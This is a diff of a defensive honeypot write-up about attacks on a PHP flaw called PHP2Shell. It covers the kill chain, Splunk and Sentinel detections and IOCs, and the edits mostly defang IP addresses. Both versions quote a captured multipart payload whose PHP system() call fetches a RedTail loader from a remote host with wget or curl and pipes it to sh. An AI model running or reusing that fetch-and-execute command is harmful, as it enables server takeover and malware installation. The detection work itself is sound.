@@ -117,7 +117,7 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 <h1>PHP2Shell in the Wild: Detecting Upload-Progress Abuse, Startup Memory Exhaustion and the Shell That Follows</h1>
 <p>I exposed an unpatched PHP 8.3.35 container the day after PHP2Shell was disclosed. Scanners came within 21 hours, a RedTail operator tried to chain it with a session-file include, and one source drove PHP out of memory 16 times. Here&#x27;s the kill chain and the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections, plus one lesson about SIEM truncation I learned the hard way.</p>
 <nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web and Server-Log Detections · Endpoint Detections · When It Fires · Hardening · IOCs</nav>
-<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web and PHP-error KQL ran against the honeypot's real logs. The endpoint queries are written from the payloads shown here, so adapt the field names to your environment.</p>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. Its Falcon queries use Event Search field names; on raw FDR data, apply the <a href="/blog/honeypot-detection-playbook/#falcon">normalisation macro</a> first. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web and PHP-error KQL ran against the honeypot's real logs. The endpoint queries are written from the payloads shown here, so adapt the field names to your environment.</p>
 
 <h2 id="what">1. What Hit the Server</h2>
 
@@ -167,7 +167,7 @@ Content-Disposition: form-data; name="PHPSESSID"
 bIDjFWKi9L5k8xKs-7FJjycGeDWFLzsi
 Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
 
-&lt;?php echo '__START__'; system('(wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s php2shell'); echo '__END__';?&gt;
+&lt;?php echo '__START__'; system('(wget --no-check-certificate -qO- hxxps://217.60.102[.]5/sh || curl -sk hxxps://217.60.102[.]5/sh) | sh -s php2shell'); echo '__END__';?&gt;
 Content-Disposition: form-data; name="pad_0"
 
 hpye1ManlAdwwCutGEGj0yKNLXszyi8IwzAXcRE9z82DdUCBLIGUQxAiw0icVPPB
@@ -196,11 +196,11 @@ bqhkQr8jbypj2sTTRfUnQdjL7g5z1464HSlzxvFnlhxZ7iYTV7ie09jvWCMak04SWI3yJYkNwvgmQbSR
 04:55:19  POST /index.php                                                     200  21,342 bytes in
 04:55:20  GET  /index.php?page=/tmp/sess_aq7Xy0nVnZLxBzLXBhoEbzud6IhDcPw8     200  285 bytes in</code></pre>
 <p>The PHP runs RedTail's usual loader, tagged with this campaign:</p>
-<pre><code>(wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s php2shell</code></pre>
+<pre><code>(wget --no-check-certificate -qO- hxxps://217.60.102[.]5/sh || curl -sk hxxps://217.60.102[.]5/sh) | sh -s php2shell</code></pre>
 <p>It failed, and not because of my server. The text fields have no boundary lines in front of them, so PHP's parser threw them away. On a real application with an include bug, a correct version of this request is a one-shot RCE.</p>
 
 <h3><span class="kc">Exploit</span> Step 3: Drive PHP out of memory during startup</h3>
-<p>On 28 October, <code>2.59.133.151</code> sent 726 requests, almost all within two minutes. Among them were 16 multipart POSTs of 1.3 to 2.2 MB, in pairs. The container's PHP error log shows one fatal error for each:</p>
+<p>On 28 October, <code>2.59.133[.]151</code> sent 726 requests, almost all within two minutes. Among them were 16 multipart POSTs of 1.3 to 2.2 MB, in pairs. The container's PHP error log shows one fatal error for each:</p>
 <pre><code>[Wed Oct 28 01:48:42.451400 2026] [php:error] [pid 21:tid 21] [client 172.18.0.1:56708] PHP Fatal error:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 4096 bytes) in Unknown on line 0
 172.18.0.1 - - [28/Oct/2026:01:48:42 +0000] "POST / HTTP/1.0" 200 364 "-" "-"
 [Wed Oct 28 01:48:43.562341 2026] [php:error] [pid 19:tid 19] [client 172.18.0.1:56710] PHP Fatal error:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 4096 bytes) in Unknown on line 0
@@ -227,7 +227,7 @@ svs
 
 <h2 id="pyramid">3. Pyramid of Pain</h2>
 <table><thead><tr><th>Level</th><th>Indicator</th><th>What I'd do with it</th></tr></thead><tbody>
-<tr><td>IP / host</td><td>Loader <code>217.60.102[.]5</code>; <code>77.90.185.20</code> (which also brute-forced SSH)</td><td>Block. Same RedTail infrastructure as in the RedTail post.</td></tr>
+<tr><td>IP / host</td><td>Loader <code>217.60.102[.]5</code>; <code>77.90.185[.]20</code> (which also brute-forced SSH)</td><td>Block. Same RedTail infrastructure as in the RedTail post.</td></tr>
 <tr><td>Network artefacts</td><td>User-Agent <code>php2shell-scan/3.1</code>; boundaries <code>----p2s…</code>, <code>----svsP2sFormBoundary…</code>; markers <code>__START__</code>, <code>svs_p2s_</code></td><td>Free to alert on, and free for them to change.</td></tr>
 <tr><td>Tools</td><td>Upload-progress field in a multipart POST; <code>page=/tmp/sess_…</code> right after</td><td>Detect the field and the include. Every variant of this technique needs both.</td></tr>
 <tr><td>TTPs</td><td>PHP startup OOM fatal errors in a burst; a PHP worker spawning a shell; PHP worker crashes</td><td>Highest value. These are what PHP2Shell <em>does</em> to a server, whatever the request looks like.</td></tr>
@@ -238,7 +238,7 @@ svs
 <pre><code>let WebAccess = Syslog
 | where SyslogMessage startswith "php_http: "
 | extend j = parse_json(substring(SyslogMessage, 10))
-| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+| project TimeGenerated, DestHost = Computer, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
           Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
           UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
 
@@ -355,8 +355,8 @@ svs
 <h2 id="iocs">8. IOCs</h2>
 <table><thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead><tbody>
 <tr><td>Second stage</td><td><code>hxxps://217.60.102[.]5/sh</code></td><td>RedTail loader, tag <code>php2shell</code></td></tr>
-<tr><td>RedTail operator</td><td><code>77.90.185.20</code></td><td>Session-file plant + include; also SSH brute force</td></tr>
-<tr><td>Memory exhaustion</td><td><code>2.59.133.151</code>, boundary <code>----lf…</code></td><td>16 startup OOMs on 28 Oct</td></tr>
+<tr><td>RedTail operator</td><td><code>77.90.185[.]20</code></td><td>Session-file plant + include; also SSH brute force</td></tr>
+<tr><td>Memory exhaustion</td><td><code>2.59.133[.]151</code>, boundary <code>----lf…</code></td><td>16 startup OOMs on 28 Oct</td></tr>
 <tr><td>Scanners</td><td>UA <code>php2shell-scan/3.1</code>; boundary <code>----svsP2sFormBoundary7Q1</code>; path <code>/bitsight/internet_census/probe</code></td><td>Exposure checks</td></tr>
 <tr><td>Markers</td><td><code>__START__</code> / <code>__END__</code>, <code>svs_p2s_open</code> / <code>svs_p2s_close</code></td><td>Execution checks</td></tr>
 </tbody></table>
